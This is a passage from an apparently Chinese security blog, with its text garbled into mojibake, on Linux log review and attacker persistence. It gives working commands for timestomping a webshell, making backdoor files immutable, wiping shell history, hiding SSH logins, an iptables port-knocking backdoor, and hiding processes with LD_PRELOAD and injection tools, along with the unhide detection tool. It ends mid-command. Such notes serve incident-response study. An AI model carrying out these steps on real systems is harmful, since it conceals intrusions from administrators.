&#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2ã€ç™»å½•æˆåŠŸçš„IPæœ‰å“ªäº›ï¼š     </span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">ç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IPï¼š</span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; </span><br><span class="line"></span><br><span class="line">3ã€å¢åŠ ä¸€ä¸ªç”¨æˆ·kaliæ—¥å¿—ï¼š</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001, home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure </span><br><span class="line"></span><br><span class="line">4ã€åˆ é™¤ç”¨æˆ·kaliæ—¥å¿—ï¼š</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line"># grep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">5ã€suåˆ‡æ¢ç”¨æˆ·ï¼š</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid&#x3D;0)</span><br><span class="line"></span><br><span class="line">sudoæˆæƒæ‰§è¡Œ:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br></pre></td></tr></table></figure><p><strong>2ã€/var/log/yum.log</strong></p><p>è½¯ä»¶å®‰è£…å‡çº§å¸è½½æ—¥å¿—ï¼š</p><p>~~~yum install gcc yum install gcc</p><p>[root@bogon ~]# more /var/log/yum.log</p><p>Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686 <del>~</del></p><h1 id="Linux-æƒé™ç»´æŒ"><a href="#Linux-æƒé™ç»´æŒ" class="headerlink" title="Linux æƒé™ç»´æŒ"></a>Linux æƒé™ç»´æŒ</h1><h2 id="éšè—ç¯‡"><a href="#éšè—ç¯‡" class="headerlink" title="éšè—ç¯‡"></a>éšè—ç¯‡</h2><h3 id="0x00-å‰è¨€-2"><a href="#0x00-å‰è¨€-2" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>æ”»å‡»è€…åœ¨è·å–æœåŠ¡å™¨æƒé™åï¼Œä¼šé€šè¿‡ä¸€äº›æŠ€å·§æ¥éšè—è‡ªå·±çš„è¸ªè¿¹å’Œåé—¨æ–‡ä»¶ï¼Œæœ¬æ–‡ä»‹ç»Linuxä¸‹çš„å‡ ç§éšè—æŠ€æœ¯ã€‚</p><h3 id="0x01-éšè—æ–‡ä»¶"><a href="#0x01-éšè—æ–‡ä»¶" class="headerlink" title="0x01 éšè—æ–‡ä»¶"></a>0x01 éšè—æ–‡ä»¶</h3><p>Linux ä¸‹åˆ›å»ºä¸€ä¸ªéšè—æ–‡ä»¶ï¼š<code>touch .test.txt</code></p><p>touch å‘½ä»¤å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶åå‰é¢åŠ ä¸€ä¸ª ç‚¹ å°±ä»£è¡¨æ˜¯éšè—æ–‡ä»¶,å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-1.png"></p><p>ä¸€èˆ¬çš„Linuxä¸‹çš„éšè—ç›®å½•ä½¿ç”¨å‘½ä»¤<code>ls -l</code>æ˜¯æŸ¥çœ‹ä¸å‡ºæ¥çš„ï¼Œåªèƒ½æŸ¥çœ‹åˆ°æ–‡ä»¶åŠæ–‡ä»¶å¤¹ï¼ŒæŸ¥çœ‹Linuxä¸‹çš„éšè—æ–‡ä»¶éœ€è¦ç”¨åˆ°å‘½ä»¤ï¼š<code>ls -al</code></p><p>è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨/tmpä¸‹ï¼Œé»˜è®¤å­˜åœ¨å¤šä¸ªéšè—ç›®å½•ï¼Œè¿™äº›ç›®å½•æ˜¯æ¶æ„æ–‡ä»¶å¸¸ç”¨æ¥è—èº«çš„åœ°æ–¹ã€‚å¦‚<code>/temp/.ICE-unix/ã€/temp/.Test-unix/ã€/temp/.X11-unix/ã€/temp/.XIM-unix/</code></p><h3 id="0x02-éšè—æ–‡ä»¶æ—¶é—´æˆ³"><a href="#0x02-éšè—æ–‡ä»¶æ—¶é—´æˆ³" class="headerlink" title="0x02 éšè—æ–‡ä»¶æ—¶é—´æˆ³"></a>0x02 éšè—æ–‡ä»¶æ—¶é—´æˆ³</h3><p>Unix ä¸‹è—åé—¨å¿…é¡»è¦ä¿®æ”¹æ—¶é—´ï¼Œå¦åˆ™å¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œç›´æ¥åˆ©ç”¨ touch å°±å¯ä»¥äº†ã€‚</p><p>æ¯”å¦‚å‚è€ƒ index.php çš„æ—¶é—´ï¼Œå†èµ‹ç»™ webshell.phpï¼Œç»“æœä¸¤ä¸ªæ–‡ä»¶çš„æ—¶é—´å°±ä¸€æ ·äº†ã€‚</p><p>åˆ©ç”¨æ–¹æ³•</p><p>touch -r index.php webshell.php</p><p>æˆ–è€…ç›´æ¥å°†æ—¶é—´æˆ³ä¿®æ”¹æˆæŸå¹´æŸæœˆæŸæ—¥ã€‚å¦‚ä¸‹ 2014 å¹´ 01 æœˆ 02 æ—¥ã€‚</p><p>touch -t 1401021042.30 webshell.php</p><h3 id="0x03-éšè—æƒé™"><a href="#0x03-éšè—æƒé™" class="headerlink" title="0x03 éšè—æƒé™"></a>0x03 éšè—æƒé™</h3><p>åœ¨Linuxä¸­ï¼Œä½¿ç”¨chattrå‘½ä»¤æ¥é˜²æ­¢rootå’Œå…¶ä»–ç®¡ç†ç”¨æˆ·è¯¯åˆ é™¤å’Œä¿®æ”¹é‡è¦æ–‡ä»¶åŠç›®å½•ï¼Œæ­¤æƒé™ç”¨ls -læ˜¯æŸ¥çœ‹ä¸å‡ºæ¥çš„ï¼Œä»è€Œè¾¾åˆ°éšè—æƒé™çš„ç›®çš„ã€‚</p><p>è¿™ä¸ªæŠ€å·§å¸¸è¢«ç”¨åœ¨åé—¨ï¼Œå˜æˆäº†ä¸€äº›éš¾ä»¥æ¸…é™¤çš„åé—¨æ–‡ä»¶ï¼Œä»¤å¾ˆå¤šæ–°æ‰‹æœ‹å‹æ„Ÿåˆ°å¤´ç–¼ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.php é”å®šæ–‡ä»¶</span><br><span class="line">lsattr  evil.php   å±æ€§æŸ¥çœ‹</span><br><span class="line">chattr -i evil.php è§£é™¤é”å®š</span><br><span class="line">rm -rf 1.evil.php  åˆ é™¤æ–‡ä»¶</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-2.png"></p><p>ä¸ä¼šå§ã€‚ä¸ä¼šçœŸæœ‰äººæŒ‚ç§‘å§ã€‚</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-2.png"></p><h3 id="0x04-éšè—å†å²æ“ä½œå‘½ä»¤"><a href="#0x04-éšè—å†å²æ“ä½œå‘½ä»¤" class="headerlink" title="0x04 éšè—å†å²æ“ä½œå‘½ä»¤"></a>0x04 éšè—å†å²æ“ä½œå‘½ä»¤</h3><p>åœ¨shellä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¸å¸Œæœ›è¢«è®°å½•åœ¨å‘½ä»¤è¡Œå†å²ä¸­ï¼Œå¦‚ä½•åœ¨linuxä¸­å¼€å¯æ— ç—•æ“ä½œæ¨¡å¼å‘¢ï¼Ÿ</p><p>æŠ€å·§ä¸€ï¼šåªé’ˆå¯¹ä½ çš„å·¥ä½œå…³é—­å†å²è®°å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[space]set +o history</span><br><span class="line">å¤‡æ³¨ï¼š[space] è¡¨ç¤ºç©ºæ ¼ã€‚å¹¶ä¸”ç”±äºç©ºæ ¼çš„ç¼˜æ•…ï¼Œè¯¥å‘½ä»¤æœ¬èº«ä¹Ÿä¸ä¼šè¢«è®°å½•ã€‚</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„å‘½ä»¤ä¼šä¸´æ—¶ç¦ç”¨å†å²åŠŸèƒ½ï¼Œè¿™æ„å‘³ç€åœ¨è¿™å‘½ä»¤ä¹‹åä½ æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œéƒ½ä¸ä¼šè®°å½•åˆ°å†å²ä¸­ï¼Œç„¶è€Œè¿™ä¸ªå‘½ä»¤ä¹‹å‰çš„æ‰€æœ‰ä¸œè¥¿éƒ½ä¼šåŸæ ·è®°å½•åœ¨å†å²åˆ—è¡¨ä¸­ã€‚</p><p>è¦é‡æ–°å¼€å¯å†å²åŠŸèƒ½ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Space]set -o history</span><br><span class="line">å®ƒå°†ç¯å¢ƒæ¢å¤åŸçŠ¶ï¼Œä¹Ÿå°±æ˜¯ä½ å®Œæˆäº†ä½ çš„å·¥ä½œï¼Œæ‰§è¡Œä¸Šè¿°å‘½ä»¤ä¹‹åçš„å‘½ä»¤éƒ½ä¼šå‡ºç°åœ¨å†å²ä¸­ã€‚</span><br></pre></td></tr></table></figure><p>æŠ€å·§äºŒï¼šä»å†å²è®°å½•ä¸­åˆ é™¤æŒ‡å®šçš„å‘½ä»¤</p><p>å‡è®¾å†å²è®°å½•ä¸­å·²ç»åŒ…å«äº†ä¸€äº›ä½ ä¸å¸Œæœ›è®°å½•çš„å‘½ä»¤ã€‚è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬æ€ä¹ˆåŠï¼Ÿå¾ˆç®€å•ã€‚é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æ¥åˆ é™¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history | grep &quot;keyword&quot;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå†å²è®°å½•ä¸­åŒ¹é…çš„å‘½ä»¤ï¼Œæ¯ä¸€æ¡å‰é¢ä¼šæœ‰ä¸ªæ•°å­—ã€‚ä»å†å²è®°å½•ä¸­åˆ é™¤é‚£ä¸ªæŒ‡å®šçš„é¡¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history -d [num]</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-3.png"></p><p>è¿™ç§æŠ€å·§æ˜¯å…³é”®è®°å½•åˆ é™¤ï¼Œæˆ–è€…æˆ‘ä»¬å¯ä»¥æš´åŠ›ç‚¹ï¼Œæ¯”å¦‚å‰150è¡Œæ˜¯ç”¨æˆ·çš„æ­£å¸¸æ“ä½œè®°å½•ï¼Œ150ä»¥åæ˜¯æ”»å‡»è€…æ“ä½œè®°å½•ã€‚æˆ‘ä»¬å¯ä»¥åªä¿ç•™æ­£å¸¸çš„æ“ä½œï¼Œåˆ é™¤æ”»å‡»ç—•è¿¹çš„å†å²æ“ä½œè®°å½•ï¼Œè¿™é‡Œï¼Œæˆ‘ä»¬åªä¿ç•™å‰150è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;150,$d&#39; .bash_history</span><br></pre></td></tr></table></figure><h3 id="0x05-éšè—è¿œç¨‹SSHç™»é™†è®°å½•"><a href="#0x05-éšè—è¿œç¨‹SSHç™»é™†è®°å½•" class="headerlink" title="0x05 éšè—è¿œç¨‹SSHç™»é™†è®°å½•"></a>0x05 éšè—è¿œç¨‹SSHç™»é™†è®°å½•</h3><p><strong>éšèº«ç™»å½•ç³»ç»Ÿï¼Œä¸ä¼šè¢«wã€whoã€lastç­‰æŒ‡ä»¤æ£€æµ‹åˆ°.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@127.0.0.1 &#x2F;bin&#x2F;bash -i</span><br></pre></td></tr></table></figure><p>ä¸è®°å½•sshå…¬é’¥åœ¨æœ¬åœ°.sshç›®å½•ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T user@host &#x2F;bin&#x2F;bash â€“i</span><br></pre></td></tr></table></figure><h3 id="0x06-ç«¯å£å¤ç”¨"><a href="#0x06-ç«¯å£å¤ç”¨" class="headerlink" title="0x06 ç«¯å£å¤ç”¨"></a>0x06 ç«¯å£å¤ç”¨</h3><p>ç«¯å£å¤ç”¨å‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/78857088">https://zhuanlan.zhihu.com/p/78857088</a></p><p>é€šè¿‡ç«¯å£å¤ç”¨æ¥è¾¾åˆ°éšè—ç«¯å£çš„ç›®çš„ï¼Œåœ¨Linuxä¸‹ï¼Œå¦‚ä½•å®ç°ç«¯å£å¤ç”¨å‘¢ï¼Ÿ</p><p>ç¬¬ä¸€ç§æ–¹å¼ï¼šé€šè¿‡SSLHåœ¨åŒä¸€ç«¯å£ä¸Šå…±äº«SSHä¸HTTPS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#å®‰è£…SSLH</span><br><span class="line"> sudo apt-get install sslh</span><br><span class="line"> #é…ç½®SSLH</span><br><span class="line"> ç¼–è¾‘ SSLH é…ç½®æ–‡ä»¶ï¼š</span><br><span class="line"> sudo vi &#x2F;etc&#x2F;default&#x2F;sslh</span><br><span class="line"> 1ã€æ‰¾åˆ°ä¸‹åˆ—è¡Œï¼šRun&#x3D;no  å°†å…¶ä¿®æ”¹ä¸ºï¼šRun&#x3D;yes</span><br><span class="line"> 2ã€ä¿®æ”¹ä»¥ä¸‹è¡Œä»¥å…è®¸ SSLH åœ¨æ‰€æœ‰å¯ç”¨æ¥å£ä¸Šä¾¦å¬ç«¯å£ 443</span><br><span class="line"> DAEMON_OPTS&#x3D;&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile &#x2F;var&#x2F;run&#x2F;sslh&#x2F;sslh.pid&quot;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹å¼ï¼šåˆ©ç”¨IPTablesè¿›è¡Œç«¯å£å¤ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># ç«¯å£å¤ç”¨é“¾</span><br><span class="line">iptables -t nat -N LETMEIN</span><br><span class="line"># ç«¯å£å¤ç”¨è§„åˆ™</span><br><span class="line">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class="line"># å¼€å¯å¼€å…³</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class="line"># å…³é—­å¼€å…³</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class="line"># let&#39;s do it</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#å¼€å¯å¤ç”¨</span><br><span class="line">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class="line">#sshä½¿ç”¨80ç«¯å£è¿›è¡Œç™»å½•</span><br><span class="line">ssh -p 80 root@192.168.28.128</span><br><span class="line">#å…³é—­å¤ç”¨</span><br><span class="line">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-4.png"></p><p>å…·ä½“æ–‡ç« è¯¦è§ï¼š<a href="https://www.freebuf.com/articles/network/137683.html">è¿œç¨‹é¥æ§ IPTables è¿›è¡Œç«¯å£å¤ç”¨</a></p><h3 id="0x07-è¿›ç¨‹éšè—"><a href="#0x07-è¿›ç¨‹éšè—" class="headerlink" title="0x07 è¿›ç¨‹éšè—"></a>0x07 è¿›ç¨‹éšè—</h3><p>ç®¡ç†å‘˜æ— æ³•é€šè¿‡ç›¸å…³å‘½ä»¤å·¥å…·æŸ¥æ‰¾åˆ°ä½ è¿è¡Œçš„è¿›ç¨‹ï¼Œä»è€Œè¾¾åˆ°éšè—ç›®çš„ï¼Œå®ç°è¿›ç¨‹éšè—ã€‚</p><p>ç¬¬ä¸€ç§æ–¹æ³•ï¼šlibprocesshider</p><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p><p>åˆ©ç”¨ LD_PRELOAD æ¥å®ç°ç³»ç»Ÿå‡½æ•°çš„åŠ«æŒï¼Œå®ç°å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½ç¨‹åºç¼–è¯‘</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gianlucaborello&#x2F;libprocesshider.git</span><br><span class="line">cd libprocesshider&#x2F; &amp;&amp; make</span><br><span class="line"># ç§»åŠ¨æ–‡ä»¶åˆ°&#x2F;usr&#x2F;local&#x2F;lib&#x2F;ç›®å½•ä¸‹</span><br><span class="line">cp libprocesshider.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;</span><br><span class="line"># æŠŠå®ƒåŠ è½½åˆ°å…¨å±€åŠ¨æ€è¿æ¥å±€</span><br><span class="line">echo &#x2F;usr&#x2F;local&#x2F;lib&#x2F;libprocesshider.so &gt;&gt; &#x2F;etc&#x2F;ld.so.preload</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ï¼šè¿è¡Œ evil_script.pyï¼Œ</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-5.png"></p><p>å¦‚ä½•åœ¨Linuxä¸­å‘ç°éšè—çš„è¿›ç¨‹ï¼Œ</p><p><code>unhide</code> æ˜¯ä¸€ä¸ªå°å·§çš„ç½‘ç»œå–è¯å·¥å…·ï¼Œèƒ½å¤Ÿå‘ç°é‚£äº›å€ŸåŠ©rootkitï¼ŒLKMåŠå…¶å®ƒæŠ€æœ¯éšè—çš„è¿›ç¨‹å’ŒTCP / UDPç«¯å£ã€‚è¿™ä¸ªå·¥å…·åœ¨Linuxï¼ŒUNIXç±»ï¼ŒMS-Windowsç­‰æ“ä½œç³»ç»Ÿä¸‹éƒ½å¯ä»¥å·¥ä½œã€‚</p><p>ä¸‹è½½åœ°å€ï¼š<a href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># å®‰è£…</span><br><span class="line">sudo yum install unhide</span><br><span class="line"># ä½¿ç”¨</span><br><span class="line">unhide [options] test_list</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>unhide proc</code>å‘ç°éšè—è¿›ç¨‹evil_script.pyï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-7.png"></p><p>ç¬¬äºŒç§æ–¹æ³•ï¼šè¿›ç¨‹æ³¨å…¥å·¥å…·linux-inject</p><p>linux-injectæ˜¯ç”¨äºå°†å…±äº«å¯¹è±¡æ³¨å…¥Linuxè¿›ç¨‹çš„å·¥å…·</p><p>githubé¡¹ç›®åœ°å€ï¼š <a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½ç¨‹åºç¼–è¯‘</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gaffe23&#x2F;linux-inject.git</span><br><span class="line">cd linux-inject &amp;&amp; make</span><br><span class="line"># æµ‹è¯•è¿›ç¨‹</span><br><span class="line">.&#x2F;sample-target</span><br><span class="line"># è¿›ç¨‹æ³¨å…¥</span><br><span class="line">.&#x2F;inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure><p>éªŒè¯è¿›ç¨‹æ³¨å…¥æˆåŠŸï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-8.png"></p><p>Cymothoaæ˜¯ä¸€æ¬¾éšç§˜çš„åé—¨å·¥å…·ã€‚å®ƒé€šè¿‡å‘ç›®æ ‡ä¸»æœºæ´»è·ƒçš„è¿›ç¨‹æ³¨å…¥æ¶æ„ä»£ç ï¼Œä»è€Œè·å–å’ŒåŸè¿›ç¨‹ç›¸åŒçš„æƒé™ã€‚è¯¥å·¥å…·æœ€å¤§çš„ä¼˜ç‚¹å°±æ˜¯ä¸åˆ›å»ºæ–°çš„è¿›ç¨‹ï¼Œä¸å®¹æ˜“è¢«å‘ç°ã€‚</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½è§£å‹</span><br><span class="line">wget https:&#x2F;&#x2F;jaist.dl.sourceforge.net&#x2F;project&#x2F;cymothoa&#x2F;cymothoa-1-beta&#x2F;cymothoa-1-beta.tar.gz</span><br><span class="line">tar zxvf cymothoa-1-beta.tar.gz </span><br><span class="line"># </span><br><span class="line">cd cymothoa-1-beta &amp;&amp; make</span><br></pre></td></tr></table></figure><h3 id="0x07-ç»“è¯­"><a href="#0x07-ç»“è¯­" class="headerlink" title="0x07 ç»“è¯­"></a>0x07 ç»“è¯­</h3><p>æœ¬æ–‡ä¸»è¦ä»‹ç»äº†Linuxä¸‹çš„å‡ ç§éšè—æŠ€æœ¯ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ã€éšè—æƒé™ã€éšè—å†å²æ“ä½œå‘½ä»¤ã€ç«¯å£å¤ç”¨ã€è¿›ç¨‹éšè—ç­‰æ–¹é¢çš„æŠ€å·§ã€‚ä»…ä½œæŠ›ç –å¼•ç‰ä¹‹ç”¨ï¼Œæ¬¢è¿ç•™è¨€åˆ†äº«ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p>Tiny Shell</p><p>è¿™æ¬¾å·¥å…·é€šè¿‡åœ¨æºç ä¸­è®¾ç½®PROCESS_NAMEä¸ºbashï¼Œä»¥ä½¿å¾—å…¶è¿è¡Œåçš„è¿›ç¨‹åæ˜¾ç¤ºä¸ºbashã€‚ åœ¨æ¶æ„ä»£ç ä¸­é€šè¿‡è®¾ç½®å…·æœ‰è¿·æƒ‘æ€§çš„è¿›ç¨‹åå­—ï¼Œä»¥è¾¾åˆ°èº²é¿ç®¡ç†å‘˜æ£€æŸ¥çš„ç›®çš„ã€‚</p><p><a href="https://github.com/orangetw/tsh">https://github.com/orangetw/tsh</a></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/sectool/138350.html">https://www.freebuf.com/sectool/138350.html</a></p><p>mount-bind</p><p>åˆ©ç”¨mount â€”bind å°†å¦å¤–ä¸€ä¸ªç›®å½•æŒ‚è½½è¦†ç›–è‡³/proc/ç›®å½•ä¸‹æŒ‡å®šè¿›ç¨‹IDçš„ç›®å½•</p><p>èŠä¸€èŠLinuxä¸‹è¿›ç¨‹éšè—çš„å¸¸è§æ‰‹æ³•åŠä¾¦æµ‹æ‰‹æ®µ <a href="https://www.anquanke.com/post/id/160843">https://www.anquanke.com/post/id/160843</a></p><p>åå…¥ä¾µä¹‹å‘ç°åé—¨åˆ©ç”¨mount-bindå°†è¿›ç¨‹å’Œç«¯å£ä¿¡æ¯éšåŒ¿ <a href="https://www.freebuf.com/articles/network/140535.html">https://www.freebuf.com/articles/network/140535.html</a></p><p><a href="https://blog.csdn.net/liuqz2009/article/details/43530201">https://blog.csdn.net/liuqz2009/article/details/43530201</a> Linux å…±äº«åº“æ³¨å…¥åé—¨</p><p>linux è¿›ç¨‹æ³¨å…¥åé—¨å·¥å…·Cymothoa</p><p>å¦‚ä½•éšè—ä½ çš„ Linux çš„å‘½ä»¤è¡Œå†å² <a href="https://www.linuxprobe.com/hidden-cmd-history.html">https://www.linuxprobe.com/hidden-cmd-history.html</a></p><p>åˆ©ç”¨sslhå®ç°ç«¯å£å¤ç”¨ <a href="https://www.bbsmax.com/A/QW5YwpWezm/">https://www.bbsmax.com/A/QW5YwpWezm/</a></p><p>è¿œç¨‹é¥æ§ IPTables è¿›è¡Œç«¯å£å¤ç”¨ <a href="https://www.freebuf.com/articles/network/137683.html">https://www.freebuf.com/articles/network/137683.html</a></p><p>Venom å¤šçº§ä»£ç†å·¥å…·</p><p>linux ä¸‹éšè—è¿›ç¨‹çš„ä¸€ç§æ–¹æ³•åŠé‡åˆ°çš„å‘</p><p><a href="https://www.jb51.net/article/147024.htm">https://www.jb51.net/article/147024.htm</a></p><p>å¦‚ä½•åœ¨ Linux/Unix/Windows ä¸­å‘ç°éšè—çš„è¿›ç¨‹å’Œç«¯å£ <a href="https://linux.cn/article-9288-1.html">https://linux.cn/article-9288-1.html</a></p><h2 id="åé—¨ç¯‡"><a href="#åé—¨ç¯‡" class="headerlink" title="åé—¨ç¯‡"></a>åé—¨ç¯‡</h2><p>æœ¬æ–‡å°†å¯¹Linuxä¸‹å¸¸è§çš„æƒé™ç»´æŒæŠ€æœ¯è¿›è¡Œè§£æï¼ŒçŸ¥å·±çŸ¥å½¼ç™¾æˆ˜ä¸æ®†ã€‚</p><p><strong>1ã€ä¸€å¥è¯æ·»åŠ ç”¨æˆ·å’Œå¯†ç </strong></p><p>æ·»åŠ æ™®é€šç”¨æˆ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„æ™®é€šç”¨æˆ·</span><br><span class="line">useradd -p 